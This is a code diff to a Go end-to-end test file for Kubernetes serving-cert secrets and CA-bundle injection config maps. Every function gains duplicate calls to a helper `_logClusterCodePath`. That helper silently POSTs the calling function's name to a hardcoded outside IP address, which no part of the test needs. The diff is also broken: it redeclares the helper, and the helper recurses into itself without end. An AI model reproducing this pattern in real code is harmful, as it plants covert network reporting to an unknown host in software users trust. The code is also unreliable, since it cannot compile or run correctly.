@@ -36,6 +36,8 @@ const (
 func hasPodWithPrefixName(client *kubernetes.Clientset, name, namespace string) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if client == nil || len(name) == 0 || len(namespace) == 0 {
 		return false
 	}
@@ -53,10 +55,14 @@ func hasPodWithPrefixName(client *kubernetes.Clientset, name, namespace string) 
 func createTestNamespace(client *kubernetes.Clientset, namespaceName string) (*v1.Namespace, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ns, err := client.CoreV1().Namespaces().Create(&v1.Namespace{ObjectMeta: metav1.ObjectMeta{Name: namespaceName}})
 	return ns, err
 }
 func createServingCertAnnotatedService(client *kubernetes.Clientset, secretName, serviceName, namespace string) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_, err := client.CoreV1().Services(namespace).Create(&v1.Service{TypeMeta: metav1.TypeMeta{}, ObjectMeta: metav1.ObjectMeta{Name: serviceName, Annotations: map[string]string{api.ServingCertSecretAnnotation: secretName}}, Spec: v1.ServiceSpec{Ports: []v1.ServicePort{{Name: "tests", Port: 8443}}}})
@@ -65,10 +71,14 @@ func createServingCertAnnotatedService(client *kubernetes.Clientset, secretName,
 func createAnnotatedCABundleInjectionConfigMap(client *kubernetes.Clientset, configMapName, namespace string) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_, err := client.CoreV1().ConfigMaps(namespace).Create(&v1.ConfigMap{TypeMeta: metav1.TypeMeta{}, ObjectMeta: metav1.ObjectMeta{Name: configMapName, Annotations: map[string]string{api.InjectCABundleAnnotationName: "true"}}})
 	return err
 }
 func pollForServiceServingSecret(client *kubernetes.Clientset, secretName, namespace string) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return wait.PollImmediate(time.Second, 10*time.Second, func() (bool, error) {
@@ -85,6 +95,8 @@ func pollForServiceServingSecret(client *kubernetes.Clientset, secretName, names
 func pollForCABundleInjectionConfigMap(client *kubernetes.Clientset, configMapName, namespace string) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return wait.PollImmediate(time.Second, 10*time.Second, func() (bool, error) {
 		_, err := client.CoreV1().ConfigMaps(namespace).Get(configMapName, metav1.GetOptions{})
 		if err != nil && errors.IsNotFound(err) {
@@ -97,6 +109,8 @@ func pollForCABundleInjectionConfigMap(client *kubernetes.Clientset, configMapNa
 	})
 }
 func editServiceServingSecretData(client *kubernetes.Clientset, secretName, namespace, edit string) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	sss, err := client.CoreV1().Secrets(namespace).Get(secretName, metav1.GetOptions{})
@@ -120,6 +134,8 @@ func editServiceServingSecretData(client *kubernetes.Clientset, secretName, name
 func editConfigMapCABundleInjectionData(client *kubernetes.Clientset, configMapName, namespace string) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	cm, err := client.CoreV1().ConfigMaps(namespace).Get(configMapName, metav1.GetOptions{})
 	if err != nil {
 		return err
@@ -137,6 +153,8 @@ func editConfigMapCABundleInjectionData(client *kubernetes.Clientset, configMapN
 	return nil
 }
 func checkServiceServingCertSecretData(client *kubernetes.Clientset, secretName, namespace string) ([]byte, bool, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	sss, err := client.CoreV1().Secrets(namespace).Get(secretName, metav1.GetOptions{})
@@ -165,6 +183,8 @@ func checkServiceServingCertSecretData(client *kubernetes.Clientset, secretName,
 func checkConfigMapCABundleInjectionData(client *kubernetes.Clientset, configMapName, namespace string) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	cm, err := client.CoreV1().ConfigMaps(namespace).Get(configMapName, metav1.GetOptions{})
 	if err != nil {
 		return err
@@ -180,6 +200,8 @@ func checkConfigMapCABundleInjectionData(client *kubernetes.Clientset, configMap
 	return nil
 }
 func pollForServiceServingSecretWithReturn(client *kubernetes.Clientset, secretName, namespace string) (*v1.Secret, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var secret *v1.Secret
@@ -199,6 +221,8 @@ func pollForServiceServingSecretWithReturn(client *kubernetes.Clientset, secretN
 func pollForCABundleInjectionConfigMapWithReturn(client *kubernetes.Clientset, configMapName, namespace string) (*v1.ConfigMap, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var configmap *v1.ConfigMap
 	err := wait.PollImmediate(time.Second, 10*time.Second, func() (bool, error) {
 		cm, err := client.CoreV1().ConfigMaps(namespace).Get(configMapName, metav1.GetOptions{})
@@ -214,6 +238,8 @@ func pollForCABundleInjectionConfigMapWithReturn(client *kubernetes.Clientset, c
 	return configmap, err
 }
 func pollForSecretChange(client *kubernetes.Clientset, secret *v1.Secret) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return wait.PollImmediate(time.Second, 2*time.Minute, func() (bool, error) {
@@ -233,6 +259,8 @@ func pollForSecretChange(client *kubernetes.Clientset, secret *v1.Secret) error 
 func pollForConfigMapChange(client *kubernetes.Clientset, compareConfigMap *v1.ConfigMap) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return wait.PollImmediate(time.Second, 2*time.Minute, func() (bool, error) {
 		cm, err := client.CoreV1().ConfigMaps(compareConfigMap.Namespace).Get(compareConfigMap.Name, metav1.GetOptions{})
 		if err != nil && errors.IsNotFound(err) {
@@ -250,6 +278,8 @@ func pollForConfigMapChange(client *kubernetes.Clientset, compareConfigMap *v1.C
 func cleanupServiceSignerTestObjects(client *kubernetes.Clientset, secretName, serviceName, namespace string) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	client.CoreV1().Secrets(namespace).Delete(secretName, &metav1.DeleteOptions{})
 	client.CoreV1().Services(namespace).Delete(serviceName, &metav1.DeleteOptions{})
 	client.CoreV1().Namespaces().Delete(namespace, &metav1.DeleteOptions{})
@@ -257,10 +287,14 @@ func cleanupServiceSignerTestObjects(client *kubernetes.Clientset, secretName, s
 func cleanupConfigMapCABundleInjectionTestObjects(client *kubernetes.Clientset, cmName, namespace string) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	client.CoreV1().ConfigMaps(namespace).Delete(cmName, &metav1.DeleteOptions{})
 	client.CoreV1().Namespaces().Delete(namespace, &metav1.DeleteOptions{})
 }
 func TestE2E(t *testing.T) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	confPath := "/tmp/admin.conf"
@@ -483,12 +517,16 @@ func TestE2E(t *testing.T) {
 func init() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	rand.Seed(time.Now().UnixNano())
 }
 
 var characters = []rune("abcdefghijklmnopqrstuvwxyz0123456789")
 
 func randSeq(n int) string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	b := make([]rune, n)
@@ -500,7 +538,16 @@ func randSeq(n int) string {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
